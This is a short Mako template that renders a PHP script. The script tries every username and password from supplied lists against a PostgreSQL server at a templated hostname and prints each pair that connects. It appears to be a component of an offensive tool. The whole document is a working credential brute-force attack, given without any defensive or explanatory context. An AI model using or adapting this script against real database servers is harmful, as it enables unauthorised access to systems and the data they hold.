<%! import json %>

$users=array (
    % for u in users:
        ${ json.dumps(u) },
    % endfor
);
$pwds=array (
    % for p in pwds:
        ${ json.dumps(p) },
    % endfor
);

foreach($users as $u) {
    foreach($pwds as $p) {
        $c=@pg_connect("host=${ hostname } user=$u password=$p connect_timeout=1");
        if($c){
            print("$u:$p".PHP_EOL);
            break;
        }
    }
}pg_close();
